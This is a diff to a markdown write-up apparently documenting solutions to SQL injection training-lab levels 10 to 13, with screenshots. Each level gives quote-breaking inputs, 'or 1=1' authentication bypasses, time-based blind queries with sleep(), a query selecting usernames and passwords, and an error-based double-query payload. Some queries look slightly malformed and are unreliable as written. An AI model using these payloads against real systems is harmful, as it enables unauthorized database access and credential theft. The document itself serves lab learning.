@@ -1,4 +1,4 @@
-# SQLI-WRITEUPS                      
+![Screenshot_2024-04-02_00-36-02](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/1f1dc92b-245a-4250-ad62-9a3d9572c07a)# SQLI-WRITEUPS                      
 
 **Level-1**                                     
 ![Screenshot_2024-04-01_07-22-36](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/e8e398cf-c59f-4afa-b0dc-b06c0115ac80)                                 
@@ -69,4 +69,36 @@ In this level we cannot find any difference whether we enter correct id number o
 **Error: '    id'    '**                                                        
 **Fixing:   ?id=1'--+**                                                       
 **Query:** *and (if((SELECT SUBSTR(table_name,1,1) from information_schema.tables where table_schema="security" limit 0,1=e,sleep(10),null))*                               
+
+**Level-10**                  
+![Screenshot_2024-04-01_23-01-06](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/b92d685f-d9ff-4afa-a8ff-ced16d2c6194)                                   
+This query is same as level-9. The only difference is instead of single quotes double quotes is used.              
+![Screenshot_2024-04-01_23-01-29](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/86e378ce-89f7-4264-a247-b8dec8ff0486)                          
+**Error: " id "  "**                               
+**Fixing: ?id=1" --+**                                   
+**Query:** *and (if((SELECT SUBSTR(table_name,1,1) from information_schema.tables where table_schema="security" limit 0,1=e,sleep(10),null))*                              
+
+**Level-11**              
+![Screenshot_2024-04-01_23-44-59](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/de5b1d38-42d7-4bd9-b75d-5b70b706c773)                                           
+In this level the username and password is sent in apost request. Once if we acheive breaking and fixing the query which helps us in retrieving data from database then we can pass any of the query using this. since it is displaying data on webpage we can use union attack, since it is displaying error in webpage we can user dobule query injections. we can use blind injection.                        
+![Screenshot_2024-04-01_23-45-52](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/7bfb5272-f289-4225-9c6d-ad146a67ab5b)                                                     
+**Error: '   username'    '**              
+**Fixing: username' or 1=1 #**                   
+**Query:** *SELECT USERNAME,PASSWORD FROM USERS WHERE LIMIT 1,1*                   
+
+**Level-12**                        
+![Screenshot_2024-04-02_00-00-07](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/c74f67f4-3a38-4922-8beb-6189d51f642a)                      
+This level is same as the above level the only difference is while breaking the query we use a double quote and parenthes instead of single quote.                          
+![Screenshot_2024-04-02_00-05-30](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/05d1f34d-ad8c-4223-aa24-df5c316cfe6c)                            
+**Error: ("   username")    ")**              
+**Fixing: username") or 1=1 #**                   
+**Query:** *SELECT USERNAME,PASSWORD FROM USERS WHERE LIMIT 1,1*              
+
+**Level-13**                
+![Screenshot_2024-04-02_00-27-13](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/d6464ae1-ba3c-448e-8008-da2c35ec4f13)                   
+In this level after loging in it is not displaying the username and password . so here we need to make a double injection since it is displaying the entire error in the webpage.                               
+![Screenshot_2024-04-02_00-36-02](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/1e94d644-c193-43ae-9299-8eb1b1d95193)                                   
+**Error: ('    username')    ')**                
+**Fixing: username') or 1=1 #**               
+**Query:** *') union (select 1 from (select count(*),(concat("~",(select database()),"~",floor(rand()*2)))a from information_schema.tables group by a)b)#*                             
 
